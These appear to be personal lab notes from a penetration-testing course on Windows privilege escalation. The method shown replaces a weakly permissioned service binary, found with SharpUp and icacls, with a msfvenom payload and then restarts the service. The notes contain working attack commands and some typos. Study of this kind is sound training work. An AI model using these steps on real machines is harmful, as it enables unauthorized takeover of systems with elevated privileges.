
#### requirements
- winpeas/sharpup detected modifiable serivice binary
- you ran icalcs  on the bin path it
- you can restart the service
### steps
- exploit modifible binaries with:
- check permissions on binary using `icalcs`, replacing the original with a malicous  msvenom binary
- 
We can use [SharpUp](https://github.com/GhostPack/SharpUp/) from the GhostPack suite of tools to check for service binaries suffering from weak ACLs.
```powershell-session
PS C:\htb> .\SharpUp.exe audit
```

![](Pasted%20image%2020250319223635.png)
The tool identifies the `PC Security Management Service`, which executes the `SecurityService.exe` binary when started.

#### Checking Permissions with icacls
![](Pasted%20image%2020250319225256.png)
#### Replacing Service Binary

This service is also startable by unprivileged users, so we can make a backup of the original binary and replace it with a malicious binary generated with `msfvenom`.

```cmd-session
C:\htb> cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
C:\htb> sc start SecurityService
```
